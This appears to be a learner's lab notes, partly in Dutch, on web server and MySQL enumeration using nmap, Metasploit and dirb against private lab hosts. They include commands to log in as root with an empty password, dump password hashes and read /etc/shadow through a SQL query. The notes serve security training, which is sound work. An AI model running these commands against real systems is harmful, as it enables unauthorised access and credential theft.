|   *Supported Methods: OPTIONS TRACE GET HEAD POST COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT*
|   Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_  Path tested: /webdav/
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

root@attackdefense:~# nmap 10.2.26.147 -sV -p 80 --script http-webdav-scan --script-args http-methods.url-path=/webdav/   

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-webdav-scan: 
|   Server Date: Thu, 08 Jun 2023 09:18:01 GMT
|   Server Type: Microsoft-IIS/10.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, LOCK, UNLOCK
|_  WebDAV type: Unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


je kunt bovenstaande command ook uitvoeren zonder p 80 (port te specificeren)


### HTTP Apache 

- run: run basic scan, service scan on specific port (80) 
- run when you see apache: nmap ip -p 80 -sV -script banner 
	- banner: is information that is shared with you computer, the first time it connects remotely to another machine 
 - lets move to: mfsconsole (metasploit framework)
	 - use auxiliary/scanner/http/http_version 
		 - set rhosts (target ip) 
			- options 
		- run 
		- exit 
	- use auxiliary/scanner/http/brute_dirs 
		- show options 
		- set rhost to target up ip 
- - dirb http://ip /usr/share/metasploit-framework/data/wordlists/directory.txt (zelfde als brute_dirs scanner in metasploit)
- other commands you can run: 
	- curl ip 
	- wget "http://ip/index" will retrieve webfiles 
	- browsh --startup-url ip (will render the website)s
	- lynx http://ip 
- robot.txt: 
	- msfconsole 
		- use  auxiliary/scanner/http/robots_txt 
		- set rhost to target ip 
		- options -> run 
![[Pasted image 20230608132146.png]]

robot.txt -> dit is een pagina die aangeeft welke bestanden mogen gelezen worden door search engines - het kan je vertellen welke subdirectories er zijn 

--lab -- 

1. Which web server software is running on the target server and also find out the version using nmap.
   
   root@INE:~# nmap 192.220.202.3 -sV

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

![[Pasted image 20230608134329.png]]

   
   
2. Which web server software is running on the target server and also find out the version using suitable metasploit module.
   
   msf6 auxiliary(scanner/http/http_version) > run
	192.220.202.3:80 Apache/2.4.18 (Ubuntu)

   
   
3. Check what web app is hosted on the web server using curl command.
   
![[Pasted image 20230608132858.png]]
   
   
4. Check what web app is hosted on the web server using wget command.
   
5. Check what web app is hosted on the web server using browsh CLI based browser.
   
6. Check what web app is hosted on the web server using lynx CLI based browser.
   
   
7. Perform bruteforce on webserver directories and list the names of directories found. Use brute_dirs metasploit module.
   
   ![[Pasted image 20230608133747.png]]
   
   
   
8. Use the directory buster (dirb) with tool/usr/share/metasploit-framework/data/wordlists/directory.txt dictionary to check if any directory is present in the root folder of the web server. List the names of found directories.
   

![[Pasted image 20230608134200.png]]
   
9. Which bot is specifically banned from accessing a specific directory (flag) ?

![[Pasted image 20230608133904.png]]
of 

![[Pasted image 20230608134850.png]]


## SLQ 


#### MySQL

Runs on linux or unix and allows users to store info in database, can be pulled and used in many operations. It is often misconfigured and vulnerable 

how do we enumerate? 
- run service scan
- run service scan on port with mysql 
- mysql -h ip -u root                                            (-h = host -u = username, we are running out because root is often default admin we will try to login in sql)
	- if you can login run: show databases (to look at the data)
	- run: use {database}; (we are looking into the database "books") or run: select count(\*) from authors; 
	- run help  to see commands in sql 
	  
- msfconsole
- use auxiliary/scanner/mysql/mysql_writeable_dirs  
- set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt 
- setg rhost 192.125.250.3                               (setg means it will be set as global host so for the whole metasploit session this ip will be used so you wont habe to re-enter it everytime)
- set verbose false    (verbose is in the advanced options and it will give you detailed status messages - to see advanced options type advances )
- set password "" 
- options  (check if you have al required items then run)

- use auxiliary/scanner/mysql/mysql_hashdump  (you will get hashes of users)
- options - set username root    set password "" run 

loginto mysql (mysql -h ip -u root)
- select load_file("/etc/shadow")   (test if you have access to files on sql system) 

nmap: 
- run: nmap ip -sV -p port --script=mysql-empty-password   (see what account you can get into with null session (empty password))
- run: nmap ip -sV -p port --script=mysql-info 
- nmap ip -sV -p port --script=mysql-users --script args="mysqlusers='root',mysqlpass=' ' " 
- if you cant log into sql you can try this: nmap ip -sV -p port --script=mysql-databases --script args="mysqlusers='root',mysqlpass=' ' " 
- ![[Pasted image 20230608170007.png]]
- nmap ip -sV -p port --script=mysql-audit --script args="mysql-audit.username='root',mysql-audit.password=' ',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit' "
- Get all the hashes: nmap ip -sV -p port --script=mysql-dump-hashes --script args="username='root',password=' ' " 
- use nmap to run a query: nmap ip -sV -p port --script=mysql-query --script args=" query='select count(\*) from books.authors;', username='root',password=' ' " 






  